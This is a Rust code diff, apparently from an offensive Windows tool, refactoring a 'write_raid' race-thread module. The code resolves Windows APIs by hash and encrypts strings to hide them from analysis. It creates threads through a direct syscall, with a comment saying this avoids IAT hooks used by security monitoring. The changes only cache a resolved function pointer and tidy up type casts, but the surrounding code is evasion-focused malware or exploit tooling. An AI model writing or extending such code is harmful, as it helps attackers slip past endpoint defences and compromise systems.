@@ -800,6 +800,10 @@ mod write_raid {
         // Also resolve NtDelayExecution for yielding.
         let delay_hash = pe_resolve::hash_str(&string_crypt::enc_str!("NtDelayExecution\0"));
         let delay_fn = pe_resolve::get_proc_address_by_hash(ntdll_base, delay_hash);
+        let switch_thread_fn = super::win_resolve::resolve_api::<super::win_resolve::FnSwitchToThread>(
+            pe_resolve::HASH_KERNEL32_DLL,
+            super::win_resolve::HASH_SWITCHTOTHREAD,
+        );
 
         log::info!("write_raid: race thread started");
 
@@ -813,21 +817,8 @@ mod write_raid {
                 while PAUSE_REQUESTED.load(Ordering::Relaxed)
                     && !STOP_REQUESTED.load(Ordering::Relaxed)
                 {
-                    unsafe {
-                        let switch_thread: super::win_resolve::FnSwitchToThread =
-                            super::win_resolve::resolve_api(
-                                pe_resolve::HASH_KERNEL32_DLL,
-                                super::win_resolve::HASH_SWITCHTOTHREAD,
-                            )
-                            .unwrap_or_else(|| {
-                                std::mem::transmute::<usize, super::win_resolve::FnSwitchToThread>(
-                                    0,
-                                )
-                            });
-                        if std::mem::transmute::<super::win_resolve::FnSwitchToThread, usize>(
-                            switch_thread,
-                        ) != 0
-                        {
+                    if let Some(switch_thread) = switch_thread_fn {
+                        unsafe {
                             switch_thread();
                         }
                     }
@@ -885,12 +876,7 @@ mod write_raid {
                 nt_delay(0, &mut delay_100ns);
             } else {
                 // Fallback: kernel32 SwitchToThread via pe_resolve.
-                if let Some(switch_fn) =
-                    super::win_resolve::resolve_api::<super::win_resolve::FnSwitchToThread>(
-                        pe_resolve::HASH_KERNEL32_DLL,
-                        super::win_resolve::HASH_SWITCHTOTHREAD,
-                    )
-                {
+                if let Some(switch_fn) = switch_thread_fn {
                     switch_fn();
                 }
             }
@@ -972,7 +958,7 @@ mod write_raid {
             // Spawn the write-raid thread.
             // Use CreateThread via syscall to avoid IAT hooks.
             let thread_proc: extern "system" fn(*mut std::ffi::c_void) -> u32 =
-                std::mem::transmute(write_raid_thread_entry as usize);
+                write_raid_thread_entry;
 
             const THREAD_WAIT_ACCESS: u64 = 0x0042;
 
@@ -983,7 +969,7 @@ mod write_raid {
                 THREAD_WAIT_ACCESS,                    // DesiredAccess (minimal)
                 0u64,                                  // ObjectAttributes
                 (-1isize) as u64,                      // ProcessHandle (current)
-                thread_proc as *mut std::ffi::c_void as u64, // StartRoutine
+                thread_proc as *const () as u64,       // StartRoutine
                 0u64,                                  // Argument
                 0u64,                                  // CreateFlags (run immediately)
                 0u64,                                  // ZeroBits
